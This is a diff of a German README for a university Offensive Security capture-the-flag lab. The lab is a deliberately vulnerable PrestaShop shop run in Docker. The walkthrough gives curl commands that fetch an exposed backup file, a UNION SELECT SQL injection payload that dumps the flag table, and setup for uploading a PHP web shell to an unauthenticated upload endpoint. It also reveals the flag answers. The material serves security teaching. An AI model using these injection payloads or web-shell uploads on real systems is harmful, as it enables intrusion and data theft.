@@ -1,5 +1,10 @@
 # Dieses Repo ist eine CTF Demo im Rahmen des Bachelorstudiums für das Fach Offensive Security
 
+Ziel des CTF ist es 4 Flags zu finden. Weiter unten ist eine Musterlösung zum finden dieser.
+
+Die Flags haben immer folgendes Format:
+
+    FLAG{Name_der_Flag}
 # CTF Walkthrough
 
 Dieses Dokument fasst alle Schritte zusammen, um das PrestaShop-CTF aufzusetzen und die vier Flags zu extrahieren.
@@ -20,28 +25,32 @@ Dieses Dokument fasst alle Schritte zusammen, um das PrestaShop-CTF aufzusetzen 
 
 1. **Repository klonen**  
    ```bash
-   git clone https://…/your-ctf-repo.git ctf
+   git clone https://github.com/DirkMe/CTF-Offsec
    cd ctf
+
 Ordnerstruktur
  
     ctf/
     ├── docker-compose.yml
     ├── Dockerfile
-    ├── start.sh
-    ├── flag_init.sh
     ├── cron-backup.sh
-    ├── exampleshell.php                # Angehängt für Lernzwecke zum direkten Upload
+    ├── exampleshell.php    # Angehängt für Lernzwecke zum direkten Upload
+    ├── docker/     
+    |   ├── start.sh     
+    |   └── flag_init.sh
     └── prestashop-1.5.6.2/            # PrestaShop + Module-Ordner
         └── modules/
-            ├── blocklayered/         # original, enthält flag1.txt
             ├── ndk_steppingpack/     # SQLi-Modul für Flag 2
             └── orderfiles/           # File-Upload-Modul für Flag 3
             
 Container starten
 
-    
     docker compose build --no-cache
     docker compose up -d
+
+Falls das Fehlschlägt:
+    docker compose -f docker-compose_v2.yml build --no-cache
+    docker compose -f docker-compose_v2.yml up -d
 
 Webshop: http://localhost:8080
 
@@ -50,12 +59,15 @@ Vulnerable Path:
 modules/blocklayered/data/backups/flag1.txt
 
 Exploit:
-curl http://localhost:8080/modules/blocklayered/data/backups/flag1.txt
+
+    curl http://localhost:8080/modules/blocklayered/data/backups/flag1.txt
  
 ⇒ FLAG{BACKUP_LEAK}
 
 
 ## Flag 2: SQL-Injection im ndk_steppingpack
+
+Zu finden im Header rechts oben als button mit dem Namen "Current Order"
 Modul:
 modules/ndk_steppingpack/
 – Front-Controller quote mit ungefiltertem product_id
@@ -85,7 +97,7 @@ curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&contr
 
 Flag-Dump:
 
-curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=-1%20UNION%20SELECT%201,flag%20FROM%20ps_ctf_flags%23"
+curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=-1%20UNION%20SELECT%201,flag%20FROM%20prefix2_0ctf_flags%23"
 ⇒ [{"product_id":"1","data":"FLAG{SQLI_SUCCESS}"}]
 (Optional mit sqlmap:)
 
@@ -97,12 +109,13 @@ curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&contr
 
 
 ## Flag 3: SSH-Key Injection via File-Upload
+
+Zu finden im Header rechts oben als button mit dem Namen "Upload File"
+
+
 Modul:
 modules/orderfiles/ajax/upload.php
 – unauth. Upload von exampleshell.php
-
-Vorbereitung:
-start.sh & Dockerfile legen /home/ctf/.ssh/authorized_keys an mit Besitzer ctf:www-data & Rechten 660, Verzeichnis 770.
 
 exampleshell.php (upload target):
 
